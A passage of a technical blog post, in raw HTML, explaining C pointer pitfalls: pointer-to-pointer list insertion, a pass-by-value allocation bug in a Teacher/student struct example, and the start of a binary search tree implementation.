class="built_in">list</span>-&gt;header;</span><br><span class="line">	<span class="comment">//找到第一个大于key的节点</span></span><br><span class="line">	<span class="keyword">while</span> ((*p) != <span class="literal">NULL</span> &amp;&amp; (*p)-&gt;key &lt; key)</span><br><span class="line">	&#123;</span><br><span class="line">		p = &amp;(*p)-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入新节点</span></span><br><span class="line">	n-&gt;next = *p;</span><br><span class="line">	*p = n;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	s_list testlist;</span><br><span class="line">	list_insert2(&amp;testlist, <span class="number">5</span>);</span><br><span class="line">	list_insert2(&amp;testlist, <span class="number">8</span>);</span><br><span class="line">	list_insert2(&amp;testlist, <span class="number">7</span>);</span><br><span class="line">	list_insert2(&amp;testlist, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It can be clearer by giving a diagram:</p>
<img src="/2019/02/12/Pointer-Manipulations-That-Should-Be-Noted/pic_1.png" width="100%" height="100%">

<p>Those examples we saw above is easy to understand. Let’s dive in some instances which are a little bit confusing.</p>
<h2 id="When-to-pass-address"><a href="#When-to-pass-address" class="headerlink" title="When to pass address?"></a>When to pass address?</h2><p>Take a look at this code:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mcheck.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结构体类型，每个导师有三个学生</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Tea</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">    <span class="type">char</span> *tName; <span class="comment">//导师名字，需要动态分配空间char *====&gt;char</span></span><br><span class="line">    <span class="type">char</span> **stu;  <span class="comment">//三个学生，需要动态分配空间，堆区数组</span></span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    &#125;Teacher;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在createTeacher中分配空间</span></span><br><span class="line"><span class="comment">//n1 =3; //导师个数</span></span><br><span class="line"><span class="comment">//n2 = 3 //学生</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">createTeacher</span><span class="params">(Teacher **p, <span class="type">int</span> n1, <span class="type">int</span> n2)</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i,j,k;   <span class="comment">//分配3个Student信息</span></span><br><span class="line">    *p = (Teacher*)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(Teacher)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)  <span class="comment">//分配3个导师的地址空间</span></span><br><span class="line">        &#123;</span><br><span class="line">        (*p)[i].tName=(<span class="type">char</span> *)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">20</span>);  </span><br><span class="line">        <span class="keyword">if</span> ((*p)[i].tName == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//(*p)-&gt;stu=(char **)malloc (sizeof(char*)*3);</span></span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">        &#123;</span><br><span class="line">         (*p)[j].stu=(<span class="type">char</span> **)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="type">char</span>*)*<span class="number">3</span>);</span><br><span class="line">         <span class="keyword">if</span> ((*p)[j].stu == <span class="literal">NULL</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;<span class="number">3</span>;k++)</span><br><span class="line">         &#123;</span><br><span class="line">         (*p)[j].stu[k]=(<span class="type">char</span> *)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">20</span>);</span><br><span class="line">         <span class="keyword">if</span> ((*p)[j].stu[k] == <span class="literal">NULL</span>)</span><br><span class="line">             &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//给成员赋值</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initTeacher</span><span class="params">(Teacher *p, <span class="type">int</span> n1, <span class="type">int</span> n2)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> i,j,k=<span class="number">0</span>;  <span class="comment">//</span></span><br><span class="line">      <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//n1 =3; //导师个数</span></span><br><span class="line">      <span class="comment">//n2 = 3 //学生</span></span><br><span class="line">     <span class="built_in">puts</span> (<span class="string">&quot;-----导师赋值------&quot;</span>);</span><br><span class="line">     <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="type">char</span> *buf[]=&#123;<span class="string">&quot;王教授&quot;</span>,<span class="string">&quot;陆教授&quot;</span>,<span class="string">&quot;田导师&quot;</span>&#125;;</span><br><span class="line">        p[i].age=<span class="number">22</span>+i;</span><br><span class="line">        <span class="comment">//printf (&quot;%d&quot;,p[i].age);</span></span><br><span class="line">        <span class="built_in">strcpy</span> (p[i].tName,buf[i]);</span><br><span class="line">    <span class="comment">//  printf (&quot;%s&quot;,p[i].tName);</span></span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          <span class="type">char</span> *arr[]=&#123;<span class="string">&quot;小黎&quot;</span>,<span class="string">&quot;小田&quot;</span>,<span class="string">&quot;小张&quot;</span>,<span class="string">&quot;小王&quot;</span>,<span class="string">&quot;小胡&quot;</span>,<span class="string">&quot;小范&quot;</span>,</span><br><span class="line">              <span class="string">&quot;小杨&quot;</span>,<span class="string">&quot;小石&quot;</span>,<span class="string">&quot;小柯&quot;</span>&#125;;</span><br><span class="line">          <span class="built_in">strcpy</span> (p[i].stu[j],arr[k]);</span><br><span class="line">          ++k;</span><br><span class="line">        <span class="comment">//  printf (&quot;%s\n&quot;,p[i].stu[j]);</span></span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印结构体成员信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printTeacher</span><span class="params">(Teacher *p, <span class="type">int</span> n1, <span class="type">int</span> n2)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> i,j;</span><br><span class="line">      <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">       <span class="built_in">printf</span> (<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;\t\t%s\n&quot;</span>,p[i].tName);  <span class="comment">//导师</span></span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="built_in">printf</span> (<span class="string">&quot;\t%s&quot;</span>,p[i].stu[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;\t\t%d\n\n&quot;</span>,p[i].age);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放空间，在函数内部把p赋值为NULL</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">freeTeacher</span><span class="params">(Teacher **p, <span class="type">int</span> n1, <span class="type">int</span> n2)</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="type">int</span> i,j;</span><br><span class="line">       <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="built_in">printf</span> (<span class="string">&quot;Empty\n&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">              <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)</span><br><span class="line">              &#123;</span><br><span class="line">                 <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">                 &#123;</span><br><span class="line">                   <span class="keyword">if</span> ((*p)[i].stu[j]!=<span class="literal">NULL</span>)</span><br><span class="line">                   &#123;</span><br><span class="line">                     <span class="built_in">free</span> ((*p)[i].stu[j]);</span><br><span class="line">                     (*p)[i].stu[j]=<span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">if</span> ((*p)[i].stu!= <span class="literal">NULL</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                   <span class="built_in">free</span> ((*p)[i].stu);</span><br><span class="line">                   (*p)[i].stu=<span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="built_in">free</span> ((*p)[i].tName);</span><br><span class="line">                 (*p)[i].tName=<span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="built_in">free</span> (*p);</span><br><span class="line">              *p=<span class="literal">NULL</span>;</span><br><span class="line">           &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n1 = <span class="number">3</span>; <span class="comment">//导师个数</span></span><br><span class="line">    <span class="type">int</span> n2 = <span class="number">3</span>; <span class="comment">//学生</span></span><br><span class="line">    Teacher *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setenv(<span class="string">&quot;MALLOC_TRACE&quot;</span>,<span class="string">&quot;1.txt&quot;</span>,<span class="number">1</span>);</span><br><span class="line">    mtrace();</span><br><span class="line"></span><br><span class="line">    ret = createTeacher(&amp;p, n1, n2);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;createTeacher err:%d\n&quot;</span>, ret);</span><br><span class="line">        <span class="built_in">exit</span> (EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    initTeacher(p, n1, n2); <span class="comment">//给成员赋值</span></span><br><span class="line">    printTeacher(p, n1, n2);</span><br><span class="line">    <span class="comment">//释放空间，在函数内部把p赋值为NULL</span></span><br><span class="line">    freeTeacher(&amp;p, n1, n2);</span><br><span class="line">    <span class="comment">// muntrace();</span></span><br><span class="line">    <span class="comment">// system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>I paste the code of function <em>createTeacher2</em> below and here comes the question, can we just simply replace the function <em>createTeacher</em> to <em>createTeacher2</em>?</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">createTeacher2</span><span class="params">(Teacher *p, <span class="type">int</span> n1, <span class="type">int</span> n2)</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i,j,k;   <span class="comment">//分配3个Student信息</span></span><br><span class="line">    p = (Teacher*)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(Teacher)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n1;i++)  <span class="comment">//分配3个导师的地址空间</span></span><br><span class="line">        &#123;</span><br><span class="line">        (p)[i].tName=(<span class="type">char</span> *)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">20</span>);  </span><br><span class="line">        <span class="keyword">if</span> ((p)[i].tName == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//(*p)-&gt;stu=(char **)malloc (sizeof(char*)*3);</span></span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">0</span>;j&lt;n2;j++)</span><br><span class="line">        &#123;</span><br><span class="line">         (p)[j].stu=(<span class="type">char</span> **)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">3</span>); </span><br><span class="line">         <span class="keyword">if</span> ((p)[j].stu == <span class="literal">NULL</span>)</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">for</span> (k=<span class="number">0</span>;k&lt;<span class="number">3</span>;k++)</span><br><span class="line">         &#123;</span><br><span class="line">         (p)[j].stu[k]=(<span class="type">char</span> *)<span class="built_in">malloc</span> (<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">20</span>);</span><br><span class="line">         <span class="keyword">if</span> ((p)[j].stu[k] == <span class="literal">NULL</span>)</span><br><span class="line">             &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Modify the code in <em>main()</em>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ret = createTeacher2(p, n1, n2);</span><br></pre></td></tr></table></figure>
<p>This code can be correctly compiled and if we run the program we will get stuck in the step of <em>initTeacher</em>. Because the pointer <em>p</em> passed to <em>createTeacher2</em> wasn’t allocated memory due to the pass-by-value feature. In other words, the pointer <em>p</em> in the <em>main()</em> block will always point to NULL. </p>
<img src="/2019/02/12/Pointer-Manipulations-That-Should-Be-Noted/pic_2.png" width="100%" height="100%">

<p>To fix it, we should use the double pointer to pass the address of pointer <em>p</em>.</p>
<p>There is another example we should take care of. Here is an implement of a binary search tree.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//binarysearchtree.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __BINARY_SEARCH_TREE__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __BINARY_SEARCH_TREE__</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> mytype;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">bstree_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	mytype data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">bstree_node</span> *<span class="title">lchild</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">bstree_node</span> *<span class="title">rchild</span>;</span></span><br><span class="line">&#125;bstree_node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">bstree</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span> (*compare)(mytype key1,mytype key2);</span><br><span class="line">	<span class="type">int</span> (*destory)(mytype data);</span><br><span class="line">	bstree_node *root;</span><br><span class="line">&#125;bstree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*compare_fuc)</span><span class="params">(mytype key1,mytype key2)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*destory_fuc)</span><span class="params">(mytype data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bstree_is_empty(tree)  (tree-&gt;size == 0)</span></span><br><span class="line"></span><br><span class="line">bstree *<span class="title function_">bstree_create</span><span class="params">(compare_fuc compare,destory_fuc destory)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//binarysearchtree.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;binarysearchtree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">bstree *<span class="title function_">bstree_create</span><span class="params">(compare_fuc compare,destory_fuc destory)</span></span><br><span class="line">&#123;</span><br><span class="line">	bstree *tree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	tree = (bstree*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bstree));</span><br><span class="line">	<span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tree-&gt;size = <span class="number">0</span>;</span><br><span class="line">    tree-&gt;compare = compare;</span><br><span class="line">    tree-&gt;destory = destory;</span><br><span class="line">	tree-&gt;root = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> tree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bstree_node *<span class="title function_">bstree_search</span><span class="params">(bstree *tree,mytype data)</span></span><br><span class="line">&#123;</span><br><span class="line">	bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    node = tree-&gt;root;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(node != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		res = tree-&gt;compare(data,node-&gt;data);</span><br><span class="line">		<span class="keyword">if</span>(res == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> node;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (res &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			node = node-&gt;rchild;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			node = node-&gt;lchild;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">   </span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bstree_insert</span><span class="params">(bstree * tree, mytype data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;second ptr address: %p&quot;</span>, &amp;tree);</span><br><span class="line">    bstree_node *node = <span class="literal">NULL</span>;</span><br><span class="line">    bstree_node *tmp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	node = (bstree_node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bstree_node));</span><br><span class="line">	<span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	node-&gt;data = data;</span><br><span class="line">	node-&gt;lchild = <span class="literal">NULL</span>;</span><br><span class="line">	node-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*如果二叉树为空，直接挂到根节点*/</span></span><br><span class="line">	<span class="keyword">if</span> (bstree_is_empty(tree))</span><br><span class="line">	&#123;</span><br><span class="line">        tree-&gt;root = node;</span><br><span class="line">		tree-&gt;size++;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tmp = tree-&gt;root;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		res = tree-&gt;compare(data,tmp-&gt;data);</span><br><span class="line">		<span class="keyword">if</span> (res &gt; <span class="number">0</span>) <span class="comment">/*去右孩子查找*/</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (tmp-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				tmp-&gt;rchild = node;</span><br><span class="line">				tree-&gt;size++;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		    tmp = tmp-&gt;rchild;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="comment">/*去左孩子查找*/</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(tmp-&gt;lchild == <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				tmp-&gt;lchild = node;</span><br><span class="line">				tree-&gt;size++;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			tmp = tmp-&gt;lchild;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bstree_delete</span><span class="params">(bstree *tree,mytype data)</span></span><br><span class="line">&#123;</span><br><span class="line">	bstree_node *node = <span class="literal">NULL</span>;<span class="comment">/*要删除的节点*/</span></span><br><span class="line">	bstree_node *pnode = <span class="literal">NULL</span>;<span class="comment">/*要删除节点的父节点*/</span></span><br><span class="line">	bstree_node *minnode = <span class="literal">NULL</span>;<span class="comment">/*要删除节点的父节点*/</span></span><br><span class="line">	bstree_node *pminnode = <span class="literal">NULL</span>;<span class="comment">/*要删除节点的父节点*/</span></span><br><span class="line">    mytype tmp = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((tree == <span class="literal">NULL</span>) || (bstree_is_empty(tree)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	node = tree-&gt;root;</span><br><span class="line">	<span class="keyword">while</span> ((node != <span class="literal">NULL</span>) &amp;&amp; ((res = tree-&gt;compare(data,node-&gt;data)) != <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		pnode = node;</span><br><span class="line">		<span class="keyword">if</span>(res &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">            node = node-&gt;rchild;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">            node = node-&gt;lchild;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/*说明要删除的节点不存在*/</span></span><br><span class="line">	<span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*1、如果要删除node有2个子节点，需要找到右子树的最小节点minnode，</span></span><br><span class="line"><span class="comment">	 * 更新minnode和node节点数据，这样minnode节点就是要删除的节点</span></span><br><span class="line"><span class="comment">	 * 再更新node和pnode节点指向要删除的节点*/</span></span><br><span class="line">	<span class="keyword">if</span> ((node-&gt;lchild != <span class="literal">NULL</span>) &amp;&amp; (node-&gt;rchild != <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		minnode = node-&gt;rchild;</span><br><span class="line">		pminnode = node;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>(minnode-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			pminnode = minnode;</span><br><span class="line">			minnode = minnode-&gt;lchild;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*node 节点和minnode节点数据互换*/</span></span><br><span class="line">        tmp = node-&gt;data;</span><br><span class="line">		node-&gt;data = minnode-&gt;data;</span><br><span class="line">		minnode-&gt;data = tmp;</span><br><span class="line">		<span class="comment">/*更新要删除的节点和其父节点*/</span></span><br><span class="line">		node = minnode;</span><br><span class="line">		pnode = pminnode;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*2、当前要删除的节点只有左孩子或者右孩子时，直接父节点的直向删除的节点*/</span></span><br><span class="line">	<span class="keyword">if</span> (node-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        minnode = node-&gt;lchild;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (node-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		minnode = node-&gt;rchild;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		minnode = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pnode == <span class="literal">NULL</span>)<span class="comment">/*当要删除的时根节点时,*/</span></span><br><span class="line">	&#123;</span><br><span class="line">		tree-&gt;root = minnode;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (pnode-&gt;lchild == node)</span><br><span class="line">	&#123;</span><br><span class="line">		pnode-&gt;lchild = minnode;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		pnode-&gt;rchild = minnode;</span><br><span class="line">	&#125;</span><br><span class="line">    tree-&gt;size--;</span><br><span class="line">	<span class="built_in">free</span> (node);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*采用递归方式删除节点*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bstree_destory_node</span><span class="params">(bstree *tree,bstree_node *root)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bstree_destory_node(tree,root-&gt;lchild);</span><br><span class="line">	bstree_destory_node(tree,root-&gt;rchild);</span><br><span class="line">	<span class="built_in">free</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*二叉搜索树销毁*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bstree_destory</span><span class="params">(bstree *tree)</span></span><br><span class="line">&#123;</span><br><span class="line">	bstree_destory_node(tree,tree-&gt;root);</span><br><span class="line">	<span class="built_in">free</span>(tree);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span 